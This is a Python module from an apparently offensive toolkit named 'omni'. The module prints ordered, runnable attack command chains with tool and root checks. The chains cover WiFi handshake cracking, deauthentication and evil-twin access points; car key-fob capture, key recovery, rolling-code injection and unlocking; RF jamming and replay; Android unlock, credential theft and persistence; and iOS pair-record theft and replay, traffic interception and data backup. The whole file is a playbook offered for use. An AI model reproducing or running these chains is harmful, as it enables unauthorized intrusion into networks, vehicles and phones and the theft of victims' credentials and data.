"""Attack planner: turn a target into an ordered, runnable command chain.

Knowing 170 modules exist is not the same as knowing which 6 to run. This walks
the trades, checks what the box actually has (tools, hardware nodes, captures,
keystore) and prints the chain with blocked steps marked and the reason
attached.

It is read-only: nothing is transmitted, nothing is modified.
"""

from __future__ import annotations

import glob
import os

from omni.core import config, proc, console
from omni.core.module import Option, Module

__all__ = ["Plan", "Step", "TRADES", "step_state"]

#: trade -> ordered (label, argv, needs) chain
TRADES = {
    "wifi": (
        ("select a monitor-mode adapter", "omni run wifi.adapters", ()),
        ("scan the area", "omni run wifi.scan METHOD=airodump", ("airodump-ng",)),
        ("capture a handshake",
         "omni run wifi.handshake BSSID=<ap> CHANNEL=<ch>",
         ("airodump-ng", "aireplay-ng")),
        ("crack it offline",
         "omni run wifi.crack_pure PCAP=<cap> WORDLIST=<list>", ()),
        ("decrypt the traffic", "omni run wifi.decrypt PCAP=<cap> PSK=<psk>", ()),
        ("batch-extract creds/urls/files",
         "omni run wifi.extract INPUT=<loot> PSK=<keys.txt>", ()),
        ("watch HTTP/HTTPS live",
         "omni run wifi.sniff IFACE=<iface> MON=true PSK=<psk>",
         ("tcpdump",)),
        ("kick clients / rejoin them", "omni run wifi.deauth_rage BSSID=<ap>",
         ("aireplay-ng",)),
        ("stand up a twin they join", "omni run wifi.pineapple PSK=<psk> "
         "UPLINK=auto", ("hostapd", "dnsmasq", "tcpdump")),
        ("read HTTPS metadata off the capture", "omni run wifi.tls PCAP=<cap>",
         ()),
    ),
    "car": (
        ("confirm the profile", "omni run car.profiles BRAND=<brand>", ()),
        ("capture a fob press", "omni run rf.sniff FREQ=<freq> SECONDS=20", ()),
        ("recover the OEM key", "omni run car.analyze SUB=<sub>", ()),
        ("fire the counter window",
         "omni run car.inject SUB=<sub> WINDOW=256", ()),
        ("or run the whole chain", "omni run car.unlock SECONDS=25", ()),
    ),
    "rf": (
        ("calibrate the front end", "omni run rf.tune FREQ=<freq>", ()),
        ("keep it adjusted while listening", "omni run rf.auto FREQ=<freq>", ()),
        ("hunt for activity", "omni run rf.hunt PLAN=eu", ()),
        ("inject what you found",
         "omni run rf.inject FILES=<sub> COPIES=4", ()),
        ("or jam/capture together", "omni run rf.rolljam FREQ=<freq>", ()),
    ),
    "android": (
        ("attach the device", "omni run android.devices", ("adb",)),
        ("unlock it", "omni run android.unlock", ("adb",)),
        ("pull the credentials", "omni run android.creds", ("adb",)),
        ("keep it alive", "omni run android.persist PACKAGE=<pkg>", ("adb",)),
    ),
    "ios": (
        ("probe reachability (read-only)", "omni run ios.probe",
         ("pymobiledevice3",)),
        ("connect with no passcode", "omni run ios.connect",
         ("pymobiledevice3",)),
        ("on the LAN instead", "omni run ios.connect HOST=<ip>",
         ("pymobiledevice3",)),
        ("audit what authorization is needed", "omni run ios.audit",
         ("pymobiledevice3",)),
        ("see who else the device trusts", "omni run ios.hosts",
         ("pymobiledevice3",)),
        ("steal a record off another host",
         "omni run ios.record ACTION=steal USERHOST=<user@box>", ("ssh",)),
        ("replay a stolen pair record", "omni run ios.record ACTION=plant",
         ()),
        ("or pair (one tap)", "omni run ios.pair", ("pymobiledevice3",)),
        ("unblock control", "omni run ios.up", ("pymobiledevice3",)),
        ("drive the screen", "omni run ios.remote", ("pymobiledevice3",)),
        ("read app sandboxes", "omni run ios.app_containers",
         ("pymobiledevice3",)),
        ("intercept traffic", "omni run ios.proxy SERVER=<ip> PORT=8080",
         ("pymobiledevice3",)),
        ("back up everything", "omni run ios.backup", ("pymobiledevice3",)),
    ),
}


class Step:
    """One chain step plus why it is blocked, if it is."""

    def __init__(self, label: str, argv: str, needs: tuple[str, ...],
                 ready: bool, reason: str = ""):
        self.label, self.argv, self.needs = label, argv, needs
        self.ready, self.reason = ready, reason

    @property
    def mark(self) -> str:
        return "ready" if self.ready else "blocked"


def step_state(needs: tuple[str, ...], root_needed: bool = False) -> tuple[bool, str]:
    """Judge one step from tool availability and root."""
    missing = [tool for tool in needs if not proc.has(tool)]
    if missing:
        return False, "missing " + ", ".join(missing)
    if root_needed and os.name != "nt" and os.geteuid() != 0:
        return False, "needs root"
    return True, ""


class Plan(Module):
    NAME = "core.plan"
    DESCRIPTION = "Print the ordered attack chain for a trade, with blockers"
    OPTIONS = (Option("TRADE", "which trade to plan", "all",
                      choices=tuple(sorted(TRADES)) + ("all",)),)

    def _context(self) -> list[tuple[str, str]]:
        """Facts about this box that change the plan."""
        captures = glob.glob(os.path.expanduser("~/omni-loot/**/*.sub"),
                             recursive=True)
        keystore = str(config.get_value("rf.keeloq_keys",
                                        "assets/keeloq_keys.txt"))
        have_keys = False
        try:
            with open(keystore, "r", encoding="utf-8") as fh:
                have_keys = any(line.strip() and not line.startswith("#")
                                for line in fh)
        except OSError:
            have_keys = False
        root = "yes" if os.name == "nt" or os.geteuid() == 0 else "no"
        return [("root", root), ("captures found", str(len(captures))),
                ("manufacturer keys", "loaded" if have_keys else "missing"),
                ("ios tunnel",
                 "configured" if config.get_value("ios.rsd_host") else "auto")]

    def execute(self) -> dict:
        trade = self.get("TRADE")
        trades = list(TRADES) if trade == "all" else [trade]
        console.kv(self._context())
        blocked = total = 0
        for name in trades:
            rows = []
            for label, argv, needs in TRADES[name]:
                ready, reason = step_state(needs,
                                           root_needed=name in ("wifi", "rf"))
                total += 1
                blocked += 0 if ready else 1
                rows.append(["ready" if ready else "blocked", label,
                             argv if ready else reason])
            console.section(name.upper())
            console.table(["", "step", "command / blocker"], rows)
        if blocked:
            console.warn(f"{blocked}/{total} step(s) blocked — install the named "
                         "tools or re-run with sudo")
        else:
            console.ok(f"all {total} step(s) runnable on this box")
        return {"blocked": blocked, "total": total, "ready": total - blocked}

